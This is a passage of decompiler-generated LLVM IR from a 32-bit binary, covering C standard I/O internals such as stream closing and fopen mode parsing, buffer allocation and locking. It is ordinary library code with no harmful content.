  %v3_804c89b = and i8 %v2_804c89b, 64
  %v4_804c89b = icmp eq i8 %v3_804c89b, 0
  br i1 %v4_804c89b, label %dec_label_pc_804c899.dec_label_pc_804c8ae_crit_edge, label %dec_label_pc_804c8a0

dec_label_pc_804c899.dec_label_pc_804c8ae_crit_edge: ; preds = %dec_label_pc_804c899
  br label %dec_label_pc_804c8ae

dec_label_pc_804c8a0:                             ; preds = %dec_label_pc_804c899
  %v1_804c8a4 = inttoptr i32 %v0_804c8a3 to i16*
  %v2_804c8a4 = call i32 @fflush_unlocked(i16* %v1_804c8a4)
  store i32 %v2_804c8a4, i32* @edi, align 4
  %v0_804c8b1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c8ae

dec_label_pc_804c8ae:                             ; preds = %dec_label_pc_804c899.dec_label_pc_804c8ae_crit_edge, %dec_label_pc_804c8a0
  %v0_804c8b1 = phi i32 [ %v0_804c8a3, %dec_label_pc_804c899.dec_label_pc_804c8ae_crit_edge ], [ %v0_804c8b1.pre, %dec_label_pc_804c8a0 ]
  %v1_804c8b1 = add i32 %v0_804c8b1, 4
  %v2_804c8b1 = inttoptr i32 %v1_804c8b1 to i32*
  %v3_804c8b1 = load i32, i32* %v2_804c8b1, align 4
  %v1_804c8b4 = call i32 @__libc_close(i32 %v3_804c8b1)
  store i32 %v1_804c8b4, i32* @eax, align 4
  %v2_804c8bc = icmp slt i32 %v1_804c8b4, 0
  %v1_804c8be = icmp eq i1 %v2_804c8bc, false
  br i1 %v1_804c8be, label %dec_label_pc_804c8c3, label %dec_label_pc_804c8c0

dec_label_pc_804c8c0:                             ; preds = %dec_label_pc_804c8ae
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804c8c3

dec_label_pc_804c8c3:                             ; preds = %dec_label_pc_804c8ae, %dec_label_pc_804c8c0
  %v0_804c8c3 = load i32, i32* @esi, align 4
  %v1_804c8c3 = add i32 %v0_804c8c3, 4
  %v2_804c8c3 = inttoptr i32 %v1_804c8c3 to i32*
  store i32 -1, i32* %v2_804c8c3, align 4
  %v2_804c8d5 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804c8d5, i32* @ebx, align 4
  %v2_804c8da = call i32 @__pthread_return_void(i32 %v2_804c8d5, i32 134526403)
  %v1_804c8e6 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804c8eb = load i32, i32* @global_var_8052548.99, align 8
  %v1_804c8f0 = add i32 %v0_804c8eb, 1
  store i32 %v1_804c8f0, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v2_804c8fb = call i32 @__pthread_return_void(i32 %v2_804c8d5, i32 1)
  store i32 %v2_804c8fb, i32* @eax, align 4
  %v0_804c903 = load i32, i32* @esi, align 4
  %v1_804c903 = inttoptr i32 %v0_804c903 to i16*
  %v2_804c903 = load i16, i16* %v1_804c903, align 2
  %v3_804c903 = and i16 %v2_804c903, 24576
  store i16 %v3_804c903, i16* %v1_804c903, align 2
  %v0_804c908 = load i32, i32* @esi, align 4
  %v1_804c908 = inttoptr i32 %v0_804c908 to i16*
  %v2_804c908 = load i16, i16* %v1_804c908, align 2
  %v3_804c908 = or i16 %v2_804c908, 48
  store i16 %v3_804c908, i16* %v1_804c908, align 2
  br i1 %v1_804c878, label %dec_label_pc_804c921, label %dec_label_pc_804c910

dec_label_pc_804c910:                             ; preds = %dec_label_pc_804c8c3
  %v2_804c914 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c914, i32* @eax, align 4
  %v2_804c919 = call i32 @__pthread_return_void(i32 %v2_804c914, i32 1)
  store i32 %v2_804c919, i32* @eax, align 4
  br label %dec_label_pc_804c921

dec_label_pc_804c921:                             ; preds = %dec_label_pc_804c8c3, %dec_label_pc_804c910
  %v0_804c921 = load i32, i32* @esi, align 4
  %v1_804c921 = add i32 %v0_804c921, 1
  %v2_804c921 = inttoptr i32 %v1_804c921 to i8*
  %v3_804c921 = load i8, i8* %v2_804c921, align 1
  %v4_804c921 = and i8 %v3_804c921, 64
  %v5_804c921 = icmp eq i8 %v4_804c921, 0
  br i1 %v5_804c921, label %dec_label_pc_804c935, label %dec_label_pc_804c927

dec_label_pc_804c927:                             ; preds = %dec_label_pc_804c921
  %v1_804c92a = add i32 %v0_804c921, 8
  %v2_804c92a = inttoptr i32 %v1_804c92a to i32*
  %v3_804c92a = load i32, i32* %v2_804c92a, align 4
  %v1_804c92d = call i32 @free(i32 %v3_804c92a)
  store i32 %v1_804c92d, i32* @eax, align 4
  br label %dec_label_pc_804c935

dec_label_pc_804c935:                             ; preds = %dec_label_pc_804c921, %dec_label_pc_804c927
  %v2_804c941 = call i32 @__pthread_return_void(i32 %v2_804c8d5, i32 134526403)
  %v1_804c94d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v0_804c954 = load i32, i32* @global_var_805254c.100, align 4
  %v1_804c954 = add i32 %v0_804c954, 1
  store i32 %v1_804c954, i32* @global_var_805254c.100, align 4
  %v2_804c95d = call i32 @__pthread_return_void(i32 %v2_804c8d5, i32 1)
  %v0_804c962 = call i32 @_stdio_openlist_dec_use()
  %v0_804c96a = load i32, i32* @edi, align 4
  ret i32 %v0_804c96a

; uselistorder directives
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 2, 1, 5, 0 }
  uselistorder label %dec_label_pc_804c935, { 1, 0 }
  uselistorder label %dec_label_pc_804c921, { 1, 0 }
  uselistorder label %dec_label_pc_804c8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c899, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804c983 = inttoptr i32 %arg2 to i8*
  %v5_804c983 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804c983, i32 0, i32 -1)
  ret i32 %v5_804c983
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c98c = load i32, i32* @ebp, align 4
  %v0_804c98d = load i32, i32* @edi, align 4
  %v0_804c98e = load i32, i32* @esi, align 4
  %v0_804c98f = load i32, i32* @ebx, align 4
  store i32 %v0_804c98f, i32* %stack_var_-16, align 4
  %v4_804c993 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804c993, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804c9a3 = load i8, i8* %arg2, align 1
  %v3_804c9a3 = zext i8 %v2_804c9a3 to i32
  %v4_804c9a3 = load i32, i32* @eax, align 4
  %v5_804c9a3 = and i32 %v4_804c9a3, -256
  %v6_804c9a3 = or i32 %v5_804c9a3, %v3_804c9a3
  store i32 %v6_804c9a3, i32* %eax.global-to-local, align 4
  %v10_804c9a5 = icmp eq i8 %v2_804c9a3, 114
  br i1 %v10_804c9a5, label %dec_label_pc_804c9e7, label %dec_label_pc_804c9a9

dec_label_pc_804c9a9:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804c9ae = icmp eq i8 %v2_804c9a3, 119
  br i1 %v10_804c9ae, label %dec_label_pc_804c9e9, label %dec_label_pc_804c9b2

dec_label_pc_804c9b2:                             ; preds = %dec_label_pc_804c9a9
  store i32 1089, i32* @ebx, align 4
  %v10_804c9b6 = icmp eq i8 %v2_804c9a3, 97
  br i1 %v10_804c9b6, label %dec_label_pc_804c9e9, label %dec_label_pc_804c9ba

dec_label_pc_804c9ba:                             ; preds = %dec_label_pc_804ca62, %dec_label_pc_804ca3c, %dec_label_pc_804c9b2
  %v0_804c9ba = load i32, i32* %stack_var_-16, align 4
  %v1_804c9ba = call i32 @__errno_location(i32 %v0_804c9ba)
  store i32 %v1_804c9ba, i32* %eax.global-to-local, align 4
  %v0_804c9bf = load i32, i32* @ebp, align 4
  %v1_804c9bf = icmp eq i32 %v0_804c9bf, 0
  %v1_804c9c1 = inttoptr i32 %v1_804c9ba to i32*
  store i32 22, i32* %v1_804c9c1, align 4
  br i1 %v1_804c9bf, label %dec_label_pc_804cbaf, label %dec_label_pc_804c9cd

dec_label_pc_804c9cd:                             ; preds = %dec_label_pc_804ca8b, %dec_label_pc_804c9ba
  %v0_804c9cd = load i32, i32* @ebp, align 4
  %v1_804c9cd = add i32 %v0_804c9cd, 1
  %v2_804c9cd = inttoptr i32 %v1_804c9cd to i8*
  %v3_804c9cd = load i8, i8* %v2_804c9cd, align 1
  %v4_804c9cd = and i8 %v3_804c9cd, 32
  %v5_804c9cd = icmp eq i8 %v4_804c9cd, 0
  br i1 %v5_804c9cd, label %dec_label_pc_804cbaf, label %dec_label_pc_804c9d7

dec_label_pc_804c9d7:                             ; preds = %dec_label_pc_804c9cd
  store i32 %v0_804c9cd, i32* %stack_var_-76, align 4
  %v1_804c9db = call i32 @free(i32 %v0_804c9cd)
  store i32 %v1_804c9db, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cbaa

dec_label_pc_804c9e7:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c9e9

dec_label_pc_804c9e9:                             ; preds = %dec_label_pc_804c9b2, %dec_label_pc_804c9a9, %dec_label_pc_804c9e7
  %v0_804c9fa = phi i32 [ 1089, %dec_label_pc_804c9b2 ], [ 577, %dec_label_pc_804c9a9 ], [ 1, %dec_label_pc_804c9e7 ]
  %v1_804c9e9 = add i32 %v4_804c993, 1
  store i32 %v1_804c9e9, i32* %eax.global-to-local, align 4
  %v2_804c9ec = inttoptr i32 %v1_804c9e9 to i8*
  %v3_804c9ec = load i8, i8* %v2_804c9ec, align 1
  %v12_804c9ec = icmp eq i8 %v3_804c9ec, 98
  br i1 %v12_804c9ec, label %dec_label_pc_804c9f4, label %dec_label_pc_804c9f2

dec_label_pc_804c9f2:                             ; preds = %dec_label_pc_804c9e9
  store i32 %v4_804c993, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c9f4

dec_label_pc_804c9f4:                             ; preds = %dec_label_pc_804c9e9, %dec_label_pc_804c9f2
  %v0_804c9f4 = phi i32 [ %v1_804c9e9, %dec_label_pc_804c9e9 ], [ %v4_804c993, %dec_label_pc_804c9f2 ]
  %v1_804c9f4 = add i32 %v0_804c9f4, 1
  %v2_804c9f4 = inttoptr i32 %v1_804c9f4 to i8*
  %v3_804c9f4 = load i8, i8* %v2_804c9f4, align 1
  %v12_804c9f4 = icmp eq i8 %v3_804c9f4, 43
  %v1_804c9f8 = icmp eq i1 %v12_804c9f4, false
  br i1 %v1_804c9f8, label %dec_label_pc_804ca02, label %dec_label_pc_804c9fa

dec_label_pc_804c9fa:                             ; preds = %dec_label_pc_804c9f4
  store i32 %v0_804c9fa, i32* %eax.global-to-local, align 4
  %v1_804c9ff = add nuw nsw i32 %v0_804c9fa, 1
  store i32 %v1_804c9ff, i32* @ebx, align 4
  br label %dec_label_pc_804ca02

dec_label_pc_804ca02:                             ; preds = %dec_label_pc_804c9f4, %dec_label_pc_804c9fa
  %v1_804ca02 = icmp eq i32 %arg3, 0
  %v1_804ca04 = icmp eq i1 %v1_804ca02, false
  br i1 %v1_804ca04, label %dec_label_pc_804ca38, label %dec_label_pc_804ca06

dec_label_pc_804ca06:                             ; preds = %dec_label_pc_804ca02
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804ca0b = call i32 @malloc(i32 80)
  store i32 %v1_804ca0b, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca0b, i32* @ebp, align 4
  %v2_804ca15 = icmp eq i32 %v1_804ca0b, 0
  br i1 %v2_804ca15, label %dec_label_pc_804cbb1, label %dec_label_pc_804ca1d

dec_label_pc_804ca1d:                             ; preds = %dec_label_pc_804ca06
  %v2_804ca0b = inttoptr i32 %v1_804ca0b to i16*
  store i16 8192, i16* %v2_804ca0b, align 2
  %v2_804ca25 = add i32 %v1_804ca0b, 8
  %v3_804ca25 = inttoptr i32 %v2_804ca25 to i32*
  store i32 0, i32* %v3_804ca25, align 4
  %v2_804ca2c = add i32 %v1_804ca0b, 56
  store i32 %v2_804ca2c, i32* %eax.global-to-local, align 4
  store i32 %v2_804ca2c, i32* %stack_var_-76, align 4
  %v1_804ca30 = call i32 @__stdio_init_mutex(i32 %v2_804ca2c)
  store i32 %v1_804ca30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca38

dec_label_pc_804ca38:                             ; preds = %dec_label_pc_804ca02, %dec_label_pc_804ca1d
  %v2_804ca38 = icmp slt i32 %arg4, 0
  br i1 %v2_804ca38, label %dec_label_pc_804ca85, label %dec_label_pc_804ca3c

dec_label_pc_804ca3c:                             ; preds = %dec_label_pc_804ca38
  %v0_804ca3c = load i32, i32* @ebx, align 4
  %v0_804ca3e = load i32, i32* @esi, align 4
  %v1_804ca3e = add i32 %v0_804ca3e, 1
  store i32 %v1_804ca3e, i32* %eax.global-to-local, align 4
  %v1_804ca41 = and i32 %v0_804ca3c, 32771
  store i32 %v1_804ca41, i32* %edx.global-to-local, align 4
  %v1_804ca47 = load i32, i32* @ebp, align 4
  %v2_804ca47 = add i32 %v1_804ca47, 4
  %v3_804ca47 = inttoptr i32 %v2_804ca47 to i32*
  store i32 %arg4, i32* %v3_804ca47, align 4
  %v0_804ca4a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca4a = add i32 %v0_804ca4a, 1
  store i32 %v1_804ca4a, i32* @edx, align 4
  %v0_804ca4b = load i32, i32* %eax.global-to-local, align 4
  %v2_804ca4b = and i32 %v0_804ca4b, %v1_804ca4a
  store i32 %v2_804ca4b, i32* %eax.global-to-local, align 4
  %v12_804ca4d = icmp eq i32 %v2_804ca4b, %v1_804ca4a
  %v1_804ca4f = icmp eq i1 %v12_804ca4d, false
  br i1 %v1_804ca4f, label %dec_label_pc_804c9ba, label %dec_label_pc_804ca55

dec_label_pc_804ca55:                             ; preds = %dec_label_pc_804ca3c
  %v0_804ca55 = load i32, i32* @esi, align 4
  %v1_804ca57 = and i32 %v0_804ca55, 1024
  %v1_804ca59 = xor i32 %v1_804ca57, 1024
  store i32 %v1_804ca59, i32* %eax.global-to-local, align 4
  %v1_804ca5e = load i32, i32* @ebx, align 4
  %v2_804ca5e = and i32 %v1_804ca5e, %v1_804ca59
  %v3_804ca5e = icmp eq i32 %v2_804ca5e, 0
  br i1 %v3_804ca5e, label %dec_label_pc_804ca55.dec_label_pc_804ca7b_crit_edge, label %dec_label_pc_804ca62

dec_label_pc_804ca55.dec_label_pc_804ca7b_crit_edge: ; preds = %dec_label_pc_804ca55
  br label %dec_label_pc_804ca7b

dec_label_pc_804ca62:                             ; preds = %dec_label_pc_804ca55
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804ca6b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804ca6b, i32* %eax.global-to-local, align 4
  %v1_804ca73 = icmp eq i32 %v3_804ca6b, 0
  %v1_804ca75 = icmp eq i1 %v1_804ca73, false
  br i1 %v1_804ca75, label %dec_label_pc_804c9ba, label %dec_label_pc_804ca62.dec_label_pc_804ca7b_crit_edge

dec_label_pc_804ca62.dec_label_pc_804ca7b_crit_edge: ; preds = %dec_label_pc_804ca62
  %v0_804ca7b.pre = load i32, i32* @esi, align 4
  %v0_804ca81.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ca7b

dec_label_pc_804ca7b:                             ; preds = %dec_label_pc_804ca55.dec_label_pc_804ca7b_crit_edge, %dec_label_pc_804ca62.dec_label_pc_804ca7b_crit_edge
  %v0_804ca81 = phi i32 [ %v1_804ca5e, %dec_label_pc_804ca55.dec_label_pc_804ca7b_crit_edge ], [ %v0_804ca81.pre, %dec_label_pc_804ca62.dec_label_pc_804ca7b_crit_edge ]
  %v0_804ca7b = phi i32 [ %v0_804ca55, %dec_label_pc_804ca55.dec_label_pc_804ca7b_crit_edge ], [ %v0_804ca7b.pre, %dec_label_pc_804ca62.dec_label_pc_804ca7b_crit_edge ]
  %v1_804ca7b = and i32 %v0_804ca7b, 32768
  %v2_804ca81 = or i32 %v1_804ca7b, %v0_804ca81
  store i32 %v2_804ca81, i32* @ebx, align 4
  br label %dec_label_pc_804caa6

dec_label_pc_804ca85:                             ; preds = %dec_label_pc_804ca38
  %v1_804ca85 = add i32 %arg4, 1
  %v8_804ca85 = icmp eq i32 %v1_804ca85, 0
  store i32 %v1_804ca85, i32* @edi, align 4
  %v0_804ca91.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804ca85, label %dec_label_pc_804ca8b, label %dec_label_pc_804ca88

dec_label_pc_804ca88:                             ; preds = %dec_label_pc_804ca85
  %v11_804ca88 = or i32 %v0_804ca91.pre, 32768
  store i32 %v11_804ca88, i32* @ebx, align 4
  br label %dec_label_pc_804ca8b

dec_label_pc_804ca8b:                             ; preds = %dec_label_pc_804ca85, %dec_label_pc_804ca88
  %v0_804ca91 = phi i32 [ %v11_804ca88, %dec_label_pc_804ca88 ], [ %v0_804ca91.pre, %dec_label_pc_804ca85 ]
  %v0_804ca92 = load i32, i32* @esi, align 4
  store i32 %v0_804ca92, i32* %stack_var_-76, align 4
  %v3_804ca93 = inttoptr i32 %v0_804ca92 to i8*
  %v4_804ca93 = call i32 @__libc_open(i8* %v3_804ca93, i32 %v0_804ca91, i32 438)
  store i32 %v4_804ca93, i32* %eax.global-to-local, align 4
  %v1_804ca9b = load i32, i32* @ebp, align 4
  %v2_804ca9b = add i32 %v1_804ca9b, 4
  %v3_804ca9b = inttoptr i32 %v2_804ca9b to i32*
  store i32 %v4_804ca93, i32* %v3_804ca9b, align 4
  %v2_804ca9e = icmp slt i32 %v4_804ca93, 0
  br i1 %v2_804ca9e, label %dec_label_pc_804c9cd, label %dec_label_pc_804caa6

dec_label_pc_804caa6:                             ; preds = %dec_label_pc_804ca8b, %dec_label_pc_804ca7b
  %v0_804caa6 = load i32, i32* @ebp, align 4
  %v1_804caa6 = inttoptr i32 %v0_804caa6 to i16*
  %v2_804caa6 = load i16, i16* %v1_804caa6, align 2
  %v3_804caa6 = and i16 %v2_804caa6, 8192
  store i16 %v3_804caa6, i16* %v1_804caa6, align 2
  %v0_804caac = load i32, i32* @ebx, align 4
  %v8_804caae = and i32 %v0_804caac, -31744
  %v1_804cab3 = urem i32 %v0_804caac, 4
  %v1_804cab6 = add nuw nsw i32 %v1_804cab3, 1
  store i32 %v1_804cab6, i32* %eax.global-to-local, align 4
  %v1_804cab7 = load i32, i32* @ebp, align 4
  %v2_804cab7 = inttoptr i32 %v1_804cab7 to i32*
  %v3_804cab7 = load i32, i32* %v2_804cab7, align 4
  %v4_804cab7 = or i32 %v3_804cab7, %v8_804caae
  %v1_804caba = mul nuw nsw i32 %v1_804cab6, 16
  %v2_804cabd = xor i32 %v1_804caba, 48
  store i32 %v2_804cabd, i32* %eax.global-to-local, align 4
  %v2_804cac0 = or i32 %v4_804cab7, %v2_804cabd
  store i32 %v2_804cac0, i32* @ebx, align 4
  %v1_804cac2 = trunc i32 %v2_804cac0 to i16
  %v3_804cac2 = inttoptr i32 %v1_804cab7 to i16*
  store i16 %v1_804cac2, i16* %v3_804cac2, align 2
  %v0_804cac6 = load i32, i32* %stack_var_-76, align 4
  %v1_804cac6 = call i32 @__errno_location(i32 %v0_804cac6)
  store i32 %v1_804cac6, i32* %eax.global-to-local, align 4
  store i32 %v1_804cac6, i32* @esi, align 4
  %v1_804cad0 = inttoptr i32 %v1_804cac6 to i32*
  %v2_804cad0 = load i32, i32* %v1_804cad0, align 4
  store i32 %v2_804cad0, i32* @edi, align 4
  %v0_804cad2 = load i32, i32* @ebp, align 4
  %v1_804cad2 = add i32 %v0_804cad2, 4
  %v2_804cad2 = inttoptr i32 %v1_804cad2 to i32*
  %v3_804cad2 = load i32, i32* %v2_804cad2, align 4
  store i32 %v3_804cad2, i32* %stack_var_-76, align 4
  %v1_804cad5 = call i32 @isatty(i32 %v3_804cad2)
  %v2_804cadd = mul i32 %v1_804cad5, 256
  store i32 %v2_804cadd, i32* %eax.global-to-local, align 4
  %v0_804cae0 = load i32, i32* @ebx, align 4
  %v2_804cae0 = or i32 %v0_804cae0, %v2_804cadd
  store i32 %v2_804cae0, i32* @ebx, align 4
  %v1_804cae2 = trunc i32 %v2_804cae0 to i16
  %v2_804cae2 = load i32, i32* @ebp, align 4
  %v3_804cae2 = inttoptr i32 %v2_804cae2 to i16*
  store i16 %v1_804cae2, i16* %v3_804cae2, align 2
  %v0_804cae6 = load i32, i32* @edi, align 4
  %v1_804cae6 = load i32, i32* @esi, align 4
  %v2_804cae6 = inttoptr i32 %v1_804cae6 to i32*
  store i32 %v0_804cae6, i32* %v2_804cae6, align 4
  %v0_804cae8 = load i32, i32* @ebp, align 4
  %v1_804cae8 = add i32 %v0_804cae8, 8
  %v2_804cae8 = inttoptr i32 %v1_804cae8 to i32*
  %v3_804cae8 = load i32, i32* %v2_804cae8, align 4
  %v4_804cae8 = icmp eq i32 %v3_804cae8, 0
  %v1_804caec = icmp eq i1 %v4_804cae8, false
  br i1 %v1_804caec, label %dec_label_pc_804cb1c, label %dec_label_pc_804caee

dec_label_pc_804caee:                             ; preds = %dec_label_pc_804caa6
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804caf6 = call i32 @malloc(i32 4096)
  store i32 %v1_804caf6, i32* %eax.global-to-local, align 4
  %v1_804cafe = load i32, i32* @ebp, align 4
  %v2_804cafe = add i32 %v1_804cafe, 8
  %v3_804cafe = inttoptr i32 %v2_804cafe to i32*
  store i32 %v1_804caf6, i32* %v3_804cafe, align 4
  %v1_804cb01 = icmp eq i32 %v1_804caf6, 0
  %v0_804cb15 = load i32, i32* @ebp, align 4
  br i1 %v1_804cb01, label %dec_label_pc_804cb15, label %dec_label_pc_804cb05

dec_label_pc_804cb05:                             ; preds = %dec_label_pc_804caee
  %v1_804cb05 = inttoptr i32 %v0_804cb15 to i16*
  %v2_804cb05 = load i16, i16* %v1_804cb05, align 2
  %v3_804cb05 = or i16 %v2_804cb05, 16384
  store i16 %v3_804cb05, i16* %v1_804cb05, align 2
  %v1_804cb0b = add i32 %v1_804caf6, 4096
  store i32 %v1_804cb0b, i32* %eax.global-to-local, align 4
  %v1_804cb10 = load i32, i32* @ebp, align 4
  %v2_804cb10 = add i32 %v1_804cb10, 12
  %v3_804cb10 = inttoptr i32 %v2_804cb10 to i32*
  store i32 %v1_804cb0b, i32* %v3_804cb10, align 4
  br label %dec_label_pc_804cb1c

dec_label_pc_804cb15:                             ; preds = %dec_label_pc_804caee
  %v1_804cb15 = add i32 %v0_804cb15, 12
  %v2_804cb15 = inttoptr i32 %v1_804cb15 to i32*
  store i32 0, i32* %v2_804cb15, align 4
  br label %dec_label_pc_804cb1c

dec_label_pc_804cb1c:                             ; preds = %dec_label_pc_804caa6, %dec_label_pc_804cb05, %dec_label_pc_804cb15
  %v0_804cb1c = load i32, i32* @ebp, align 4
  %v1_804cb1c = add i32 %v0_804cb1c, 8
  %v2_804cb1c = inttoptr i32 %v1_804cb1c to i32*
  %v3_804cb1c = load i32, i32* %v2_804cb1c, align 4
  store i32 %v3_804cb1c, i32* %eax.global-to-local, align 4
  %v1_804cb1f = add i32 %v0_804cb1c, 2
  %v2_804cb1f = inttoptr i32 %v1_804cb1f to i8*
  store i8 0, i8* %v2_804cb1f, align 1
  %v0_804cb23 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb23 = load i32, i32* @ebp, align 4
  %v2_804cb23 = add i32 %v1_804cb23, 24
  %v3_804cb23 = inttoptr i32 %v2_804cb23 to i32*
  store i32 %v0_804cb23, i32* %v3_804cb23, align 4
  %v0_804cb26 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb26 = load i32, i32* @ebp, align 4
  %v2_804cb26 = add i32 %v1_804cb26, 28
  %v3_804cb26 = inttoptr i32 %v2_804cb26 to i32*
  store i32 %v0_804cb26, i32* %v3_804cb26, align 4
  %v0_804cb29 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb29 = load i32, i32* @ebp, align 4
  %v2_804cb29 = add i32 %v1_804cb29, 16
  %v3_804cb29 = inttoptr i32 %v2_804cb29 to i32*
  store i32 %v0_804cb29, i32* %v3_804cb29, align 4
  %v0_804cb2c = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb2c = load i32, i32* @ebp, align 4
  %v2_804cb2c = add i32 %v1_804cb2c, 20
  %v3_804cb2c = inttoptr i32 %v2_804cb2c to i32*
  store i32 %v0_804cb2c, i32* %v3_804cb2c, align 4
  %v0_804cb2f = load i32, i32* @ebp, align 4
  %v1_804cb2f = add i32 %v0_804cb2f, 44
  %v2_804cb2f = inttoptr i32 %v1_804cb2f to i32*
  store i32 0, i32* %v2_804cb2f, align 4
  %v0_804cb36 = load i32, i32* @ebp, align 4
  %v1_804cb36 = add i32 %v0_804cb36, 1
  %v2_804cb36 = inttoptr i32 %v1_804cb36 to i8*
  %v3_804cb36 = load i8, i8* %v2_804cb36, align 1
  %v4_804cb36 = and i8 %v3_804cb36, 32
  %v5_804cb36 = icmp eq i8 %v4_804cb36, 0
  %v0_804cb3a = load i32, i32* @global_var_80521c0.101, align 64
  store i32 %v0_804cb3a, i32* @eax, align 4
  %v2_804cb3f = add i32 %v0_804cb36, 52
  %v3_804cb3f = inttoptr i32 %v2_804cb3f to i32*
  store i32 %v0_804cb3a, i32* %v3_804cb3f, align 4
  br i1 %v5_804cb36, label %dec_label_pc_804cbb1, label %dec_label_pc_804cb44

dec_label_pc_804cb44:                             ; preds = %dec_label_pc_804cb1c
  %v2_804cb4f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cb4f, i32* %stack_var_-76, align 4
  %v2_804cb54 = call i32 @__pthread_return_void(i32 %v2_804cb4f, i32 134526403)
  store i32 %v2_804cb54, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* %stack_var_-76, align 4
  %v1_804cb60 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cb60, i32* @eax, align 4
  %v2_804cb72 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804cb72, i32* %stack_var_-76, align 4
  %v2_804cb77 = call i32 @__pthread_return_void(i32 %v2_804cb72, i32 134526403)
  store i32 %v2_804cb77, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* %stack_var_-76, align 4
  %v1_804cb83 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cb88 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cb88, i32* @eax, align 4
  %v1_804cb8d = load i32, i32* @ebp, align 4
  %v2_804cb8d = add i32 %v1_804cb8d, 32
  %v3_804cb8d = inttoptr i32 %v2_804cb8d to i32*
  store i32 %v0_804cb88, i32* %v3_804cb8d, align 4
  %v0_804cb90 = load i32, i32* @ebp, align 4
  store i32 %v0_804cb90, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  %v2_804cb96 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804cb96, i32* @ecx, align 4
  store i32 %v2_804cb72, i32* %stack_var_-76, align 4
  %v2_804cb9b = call i32 @__pthread_return_void(i32 %v2_804cb72, i32 1)
  store i32 %v2_804cb72, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804cb4f, i32* %stack_var_-76, align 4
  %v2_804cba5 = call i32 @__pthread_return_void(i32 %v2_804cb4f, i32 1)
  store i32 %v2_804cba5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbaa

dec_label_pc_804cbaa:                             ; preds = %dec_label_pc_804c9d7, %dec_label_pc_804cb44
  br label %dec_label_pc_804cbb1

dec_label_pc_804cbaf:                             ; preds = %dec_label_pc_804c9cd, %dec_label_pc_804c9ba
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cbb1

dec_label_pc_804cbb1:                             ; preds = %dec_label_pc_804cb1c, %dec_label_pc_804ca06, %dec_label_pc_804cbaa, %dec_label_pc_804cbaf
  %v0_804cbb4 = load i32, i32* @ebp, align 4
  store i32 %v0_804cbb4, i32* %eax.global-to-local, align 4
  %v2_804cbb6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cbb6, i32* @ebx, align 4
  store i32 %v0_804c98e, i32* @esi, align 4
  store i32 %v0_804c98d, i32* @edi, align 4
  store i32 %v0_804c98c, i32* @ebp, align 4
  ret i32 %v0_804cbb4

; uselistorder directives
  uselistorder i32 %v2_804cb72, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804cb4f, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804cb15, { 1, 0 }
  uselistorder i32 %v1_804caf6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804cadd, { 1, 0 }
  uselistorder i32 %v1_804cac6, { 1, 0, 2 }
  uselistorder i32 %v11_804ca88, { 1, 0 }
  uselistorder i32 %v0_804ca91.pre, { 1, 0 }
  uselistorder i32 %v1_804ca59, { 1, 0 }
  uselistorder i32 %v0_804ca55, { 1, 0 }
